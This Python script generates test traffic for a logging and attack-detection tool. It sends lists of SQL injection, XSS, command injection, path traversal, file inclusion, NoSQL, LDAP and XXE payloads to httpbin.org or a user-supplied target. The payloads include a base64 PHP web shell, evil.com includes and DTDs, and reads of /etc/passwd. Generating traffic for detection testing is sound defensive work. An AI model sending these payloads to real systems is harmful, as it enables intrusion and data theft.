#!/usr/bin/env python3
"""
HTTP Attack Tester
Simple script to generate HTTP attack traffic for testing proxy logging and attack detection.
This script sends various attack patterns to a target server to generate logs for analysis.
"""

import requests
import time
import random
import sys
from urllib.parse import urljoin
import urllib3

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class HTTPAttackTester:
    def __init__(self, target_url="http://httpbin.org", proxy_url=None, delay_range=(1, 3)):
        """
        Initialize the HTTP Attack Tester.
        
        Args:
            target_url: Target server URL (default: httpbin.org for safe testing)
            proxy_url: Proxy URL if using proxy (e.g., "http://127.0.0.1:8080")
            delay_range: Tuple of (min, max) seconds to wait between requests
        """
        self.target_url = target_url.rstrip('/')
        self.delay_range = delay_range
        self.session = requests.Session()
        
        # Configure proxy if provided
        if proxy_url:
            self.session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            print(f"🔗 Using proxy: {proxy_url}")
        
        # Set realistic headers
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        print(f"🎯 Target: {self.target_url}")
        print(f"⏱️  Delay range: {delay_range[0]}-{delay_range[1]} seconds")
    
    def wait_between_requests(self):
        """Wait a random amount of time between requests."""
        delay = random.uniform(*self.delay_range)
        print(f"⏳ Waiting {delay:.1f} seconds...")
        time.sleep(delay)
    
    def send_request(self, method, path, params=None, data=None, headers=None):
        """Send a request and handle errors gracefully."""
        url = urljoin(self.target_url, path)
        
        try:
            response = self.session.request(
                method=method,
                url=url,
                params=params,
                data=data,
                headers=headers or {},
                timeout=10,
                verify=False  # For testing with self-signed certificates
            )
            
            print(f"📤 {method} {url}")
            if params:
                print(f"   Params: {params}")
            if data:
                print(f"   Data: {data}")
            print(f"📥 Response: {response.status_code} ({len(response.content)} bytes)")
            
            return response
            
        except requests.exceptions.RequestException as e:
            print(f"❌ Request failed: {e}")
            return None
    
    def test_sql_injection_attacks(self):
        """Test various SQL injection attack patterns."""
        print("\n🗄️  Testing SQL Injection Attacks")
        print("-" * 40)
        
        sql_payloads = [
            "1' OR '1'='1",
            "1' OR 1=1--",
            "1' UNION SELECT null,null,null--",
            "1'; DROP TABLE users;--",
            "admin'--",
            "' OR 1=1#",
            "1' AND (SELECT COUNT(*) FROM users) > 0--",
            "1' OR SLEEP(5)--"
        ]
        
        for payload in sql_payloads:
            self.send_request('GET', '/get', params={
                'id': payload,
                'user': 'admin',
                'search': payload
            })
            self.wait_between_requests()
    
    def test_xss_attacks(self):
        """Test various XSS attack patterns."""
        print("\n🚨 Testing XSS Attacks")
        print("-" * 40)
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<script>document.cookie='stolen'</script>",
            "';alert('XSS');//"
        ]
        
        for payload in xss_payloads:
            # Test in URL parameters
            self.send_request('GET', '/get', params={
                'q': payload,
                'search': payload,
                'comment': payload
            })
            self.wait_between_requests()
            
            # Test in POST data
            self.send_request('POST', '/post', data={
                'message': payload,
                'content': payload
            })
            self.wait_between_requests()
    
    def test_command_injection_attacks(self):
        """Test various command injection attack patterns."""
        print("\n💻 Testing Command Injection Attacks")
        print("-" * 40)
        
        cmd_payloads = [
            "; whoami",
            "| whoami",
            "&& whoami",
            "; ls -la",
            "| cat /etc/passwd",
            "&& ping -c 1 127.0.0.1",
            "; id",
            "| uname -a"
        ]
        
        for payload in cmd_payloads:
            self.send_request('GET', '/get', params={
                'cmd': payload,
                'exec': payload,
                'system': payload
            })
            self.wait_between_requests()
    
    def test_directory_traversal_attacks(self):
        """Test directory traversal attack patterns."""
        print("\n📁 Testing Directory Traversal Attacks")
        print("-" * 40)
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts"
        ]
        
        for payload in traversal_payloads:
            self.send_request('GET', '/get', params={
                'file': payload,
                'path': payload,
                'include': payload
            })
            self.wait_between_requests()
    
    def test_file_inclusion_attacks(self):
        """Test file inclusion attack patterns."""
        print("\n📄 Testing File Inclusion Attacks")
        print("-" * 40)
        
        inclusion_payloads = [
            "http://evil.com/shell.txt",
            "php://input",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            "expect://whoami",
            "/proc/self/environ"
        ]
        
        for payload in inclusion_payloads:
            self.send_request('GET', '/get', params={
                'page': payload,
                'include': payload,
                'file': payload
            })
            self.wait_between_requests()
    
    def test_nosql_injection_attacks(self):
        """Test NoSQL injection attack patterns."""
        print("\n🍃 Testing NoSQL Injection Attacks")
        print("-" * 40)
        
        nosql_payloads = [
            "'; return true; var dummy='",
            "' || '1'=='1",
            "'; return this.username == 'admin' && this.password == 'admin'; var dummy='",
            "$ne",
            "[$regex]",
            "{$gt: ''}",
            "'; sleep(5000); var dummy='"
        ]
        
        for payload in nosql_payloads:
            self.send_request('GET', '/get', params={
                'username': payload,
                'filter': payload,
                'query': payload
            })
            self.wait_between_requests()
    
    def test_ldap_injection_attacks(self):
        """Test LDAP injection attack patterns."""
        print("\n🔍 Testing LDAP Injection Attacks")
        print("-" * 40)
        
        ldap_payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*))%00",
            "*()|%26'",
            "*)(objectClass=*"
        ]
        
        for payload in ldap_payloads:
            self.send_request('GET', '/get', params={
                'username': payload,
                'user': payload,
                'search': payload
            })
            self.wait_between_requests()
    
    def test_xxe_attacks(self):
        """Test XXE (XML External Entity) attack patterns."""
        print("\n📋 Testing XXE Attacks")
        print("-" * 40)
        
        xxe_payloads = [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "http://evil.com/evil.dtd">]><data>&file;</data>'
        ]
        
        for payload in xxe_payloads:
            self.send_request('POST', '/post', 
                            data=payload,
                            headers={'Content-Type': 'application/xml'})
            self.wait_between_requests()
    
    def test_suspicious_user_agents(self):
        """Test with suspicious user agents."""
        print("\n🕵️  Testing Suspicious User Agents")
        print("-" * 40)
        
        suspicious_agents = [
            "sqlmap/1.0",
            "Burp Suite Professional",
            "Nikto/2.1.6",
            "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
            "python-requests/2.25.1",
            "curl/7.68.0",
            "Wget/1.20.3",
            "ZAP/2.10.0"
        ]
        
        for agent in suspicious_agents:
            self.send_request('GET', '/get', 
                            params={'test': 'scanner'},
                            headers={'User-Agent': agent})
            self.wait_between_requests()
    
    def test_rate_limiting_bypass(self):
        """Test rapid requests to trigger rate limiting detection."""
        print("\n⚡ Testing Rate Limiting Bypass")
        print("-" * 40)
        
        print("Sending rapid requests...")
        for i in range(10):
            self.send_request('GET', '/get', params={
                'attempt': i,
                'rapid': 'true'
            })
            time.sleep(0.1)  # Very short delay
    
    def run_all_tests(self):
        """Run all attack tests."""
        print("🚀 Starting HTTP Attack Testing")
        print("=" * 50)
        
        try:
            # Test basic connectivity
            response = self.send_request('GET', '/get', params={'test': 'connectivity'})
            if not response:
                print("❌ Cannot connect to target. Please check the URL and network connectivity.")
                return False
            
            print("✅ Connectivity test passed")
            self.wait_between_requests()
            
            # Run all attack tests
            self.test_sql_injection_attacks()
            self.test_xss_attacks()
            self.test_command_injection_attacks()
            self.test_directory_traversal_attacks()
            self.test_file_inclusion_attacks()
            self.test_nosql_injection_attacks()
            self.test_ldap_injection_attacks()
            self.test_xxe_attacks()
            self.test_suspicious_user_agents()
            self.test_rate_limiting_bypass()
            
            print("\n🎉 All attack tests completed!")
            print("📊 Check your proxy logs or upload the captured traffic for analysis.")
            return True
            
        except KeyboardInterrupt:
            print("\n⏹️  Testing interrupted by user")
            return False
        except Exception as e:
            print(f"\n❌ Error during testing: {e}")
            return False

def main():
    """Main function to run the HTTP attack tester."""
    print("🧪 HTTP Attack Tester for AttackReplay Pro")
    print("=" * 50)
    
    # Configuration
    target_url = "http://httpbin.org"  # Safe testing target
    proxy_url = None  # Set to "http://127.0.0.1:8080" if using proxy
    
    # Check if user wants to use proxy
    use_proxy = input("📡 Use HTTP proxy for traffic capture? (y/n): ").lower().strip()
    if use_proxy == 'y':
        proxy_input = input("🔗 Enter proxy URL (default: http://127.0.0.1:8080): ").strip()
        proxy_url = proxy_input if proxy_input else "http://127.0.0.1:8080"
    
    # Check if user wants to change target
    target_input = input(f"🎯 Target URL (default: {target_url}): ").strip()
    if target_input:
        target_url = target_input
    
    # Delay configuration
    delay_input = input("⏱️  Delay between requests in seconds (default: 1-3): ").strip()
    if delay_input:
        try:
            delay = float(delay_input)
            delay_range = (delay, delay)
        except ValueError:
            delay_range = (1, 3)
    else:
        delay_range = (1, 3)
    
    print(f"\n📋 Configuration:")
    print(f"   Target: {target_url}")
    print(f"   Proxy: {proxy_url or 'None'}")
    print(f"   Delay: {delay_range[0]}-{delay_range[1]} seconds")
    
    # Confirm before starting
    confirm = input(f"\n⚠️  Start attack testing? (y/n): ").lower().strip()
    if confirm != 'y':
        print("❌ Testing cancelled.")
        sys.exit(0)
    
    # Initialize and run tester
    tester = HTTPAttackTester(
        target_url=target_url,
        proxy_url=proxy_url,
        delay_range=delay_range
    )
    
    success = tester.run_all_tests()
    
    if success:
        print("\n✅ HTTP attack testing completed successfully!")
        print("\n📋 Next steps:")
        print("   1. Check your proxy traffic logs")
        print("   2. Export the captured traffic")
        print("   3. Upload the logs to AttackReplay Pro for analysis")
        print("   4. Review detected attack patterns in the dashboard")
    else:
        print("\n❌ HTTP attack testing failed or was interrupted.")
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()